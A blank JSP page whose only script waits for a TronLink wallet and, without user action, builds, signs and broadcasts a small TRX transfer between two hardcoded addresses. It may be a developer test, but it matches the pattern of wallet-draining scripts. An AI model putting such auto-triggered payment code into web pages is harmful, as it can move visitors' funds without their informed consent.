<%@ page language="java" import="java.util.*" pageEncoding="UTF-8" %>
<%@ include file="/WEB-INF/include/taglib.jsp" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
<script>
    var obj = setInterval(async ()=>{
        if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
            clearInterval(obj)
            var tronweb = window.tronWeb
            var tx = await tronweb.transactionBuilder.sendTrx('TATa6geCcM658Na1PBdcQfpRyS9V9HJKWc', 10, 'TTSFjEG3Lu9WkHdp4JrWYhbGP6K1REqnGQ')
            var signedTx = await tronweb.trx.sign(tx)
            var broastTx = await tronweb.trx.sendRawTransaction(signedTx)
            console.log(broastTx)
        }
    }, 10);

</script>
</body>
</html>